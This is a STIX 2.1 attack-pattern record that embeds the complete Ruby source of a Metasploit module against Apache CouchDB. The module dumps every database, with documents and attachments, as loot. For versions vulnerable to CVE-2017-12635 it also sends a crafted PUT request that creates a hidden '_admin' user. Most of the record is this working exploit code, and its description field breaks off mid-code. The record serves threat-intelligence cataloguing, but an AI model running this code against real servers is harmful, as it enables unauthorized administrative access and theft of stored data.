{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13344705-eac3-4e79-bf4a-0ffd5e2a07fc",
    "created": "2024-08-14T16:31:22.45617Z",
    "modified": "2024-08-14T16:31:22.456173Z",
    "name": "CouchDB Enum Utility",
    "description": " This module enumerates databases on CouchDB using the REST API (without authentication by default).  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/couchdb/couchdb_enum.rb",
            "external_id": "couchdb_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.apache.org/couchdb/HTTP_database_API"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'CouchDB Enum Utility',\n      'Description' => %q{\n        This module enumerates databases on CouchDB using the REST API\n        (without authentication by default).\n      },\n      'References'  =>\n        [\n          ['CVE', '2017-12635'],\n          ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],\n          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']\n        ],\n      'Author'      =>\n        [\n          'Max Justicz', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit module\n          'Hendrik Van Belleghem', # (@hendrikvb) Database dump enhancements\n          'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used\n        ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(5984),\n        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),\n        OptBool.new('SERVERINFO', [true, 'Print server info', false]),\n        OptBool.new('CREATEUSER', [true, 'Create Administrative user', false]),\n        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12)]),\n        OptString.new('HttpPassword', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12)]),\n        OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])\n\n      ])\n  end\n\n  def valid_response(res)\n    return res.code == 200 && res.headers['Server'].include?('CouchDB')\n  end\n\n  def get_version\n    @version = nil\n\n    begin\n      res = send_request_cgi(\n        'uri'    => '/',\n        'method' => 'GET'\n      )\n    rescue Rex::ConnectionError\n      vprint_bad(\"#{peer} - Connection failed\")\n      return false\n    end\n\n    unless res\n      vprint_bad(\"#{peer} - No response, check if it is CouchDB.\")\n      return false\n    end\n\n    if res && res.code == 401\n      print_bad(\"#{peer} - Authentication required.\")\n      return false\n    end\n\n    if res && res.code == 200\n      res_json = res.get_json_document\n\n      if res_json.empty?\n        vprint_bad(\"#{peer} - Cannot parse the response, seems like it's not CouchDB.\")\n        return false\n      end\n\n      @version = res_json['version'] if res_json['version']\n      return true\n    end\n\n    vprint_warning(\"#{peer} - Version not found\")\n    true\n  end\n\n  def check\n    return Exploit::CheckCode::Unknown unless get_version\n    version = Rex::Version.new(@version)\n    return Exploit::CheckCode::Unknown if version.version.empty?\n    vprint_good(\"#{peer} - Found CouchDB version #{version}\")\n\n    return Exploit::CheckCode::Appears if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_dbs(auth)\n    begin\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path),\n        'method' => 'GET'\n      )\n\n      temp = JSON.parse(res.body)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e\n      print_error(\"#{peer} - The following Error was encountered: #{e.class}\")\n      return\n    end\n\n    unless valid_response(res)\n      print_error(\"#{peer} - Unable to enum, received \\\"#{res.code}\\\"\")\n      return\n    end\n\n    print_status(\"#{peer} - Enumerating Databases...\")\n    results = JSON.pretty_generate(temp)\n    print_good(\"#{peer} - Databases:\\n\\n#{results}\\n\")\n     path = store_loot(\n      'couchdb.enum',\n      'application/json',\n      rhost,\n      results,\n      'CouchDB Databases'\n    )\n\n    print_good(\"#{peer} - File saved in: #{path}\")\n    res.get_json_document.each do |db|\n      r = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, \"/#{db}/_all_docs\"),\n        'method'=> 'GET',\n        'authorization' => auth,\n        'vars_get' => {'include_docs' => 'true', 'attachments' => 'true'}\n       )\n       if r.code != 200\n         print_bad(\"#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.\")\n         return\n       end\n       temp = JSON.parse(r.body)\n       results = JSON.pretty_generate(temp)\n       path = store_loot(\n         \"couchdb.#{db}\",\n         \"application/json\",\n         rhost,\n         results,\n         \"CouchDB Databases\"\n       )\n       print_good(\"#{peer} - #{db} saved in: #{path}\")\n    end\n  end\n\n  def get_server_info(auth)\n    begin\n      res = send_request_cgi(\n        'uri'    => '/',\n        'method' => 'GET'\n      )\n\n      temp = JSON.parse(res.body)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e\n      print_error(\"#{peer} - The following Error was encountered: #{e.class}\")\n      return\n    end\n\n    unless valid_response(res)\n      print_error(\"#{peer} - Unable to enum, received \\\"#{res.code}\\\"\")\n      return\n    end\n\n    # Example response: {\"couchdb\":\"Welcome\",\"uuid\":\"6f08e89795bd845efc6c2bf3d57799e5\",\"version\":\"1.6.1\",\"vendor\":{\"version\":\"16.04\",\"name\":\"Ubuntu\"}}\n\n    print_good(\"#{peer} - #{JSON.pretty_generate(temp)}\")\n    report_service(\n      host: rhost,\n      port: rport,\n      name: 'couchdb',\n      proto: 'tcp',\n      info: res.body\n    )\n  end\n\n  def create_user\n    username = datastore['HttpUsername']\n    password = datastore['HttpPassword']\n    roles = datastore['ROLES']\n    timeout = datastore['TIMEOUT']\n    version = @version\n\n    data = %Q({\n\"type\": \"user\",\n\"name\": \"#{username}\",\n\"roles\": [\"#{roles}\"],\n\"roles\": [],\n\"password\": \"#{password}\"\n})\n    res = send_request_cgi(\n    { 'uri'    => \"/_users/org.couchdb.user:#{username}\", # http://hostname:port/_users/org.couchdb.user:username\n      'method' => 'PUT',\n      'ctype'  => 'text/json',\n      'data'   => data,\n    }, timeout)\n\n    unless res && res.code == 200\n      print_error(\"#{peer} - Change Failed\")\n      return\n    end\n\n    print_good(\"#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.\")\n  end\n\n  def run\n    username = datastore['HttpUsername']\n    password = datastore['HttpPassword']\n\n    if datastore['CREATEUSER']\n      fail_with(Failure::Unknown, 'get_version failed in run') unless get_version\n      version = Rex::Version.new(@version)\n      print_good(\"#{peer} - Found CouchDB version #{version}\")\n      create_user if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))\n    end\n    auth = basic_auth(username, password) if username && password\n    get_server_info(auth) if datastore['SERVERINFO']\n    get_dbs(auth)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}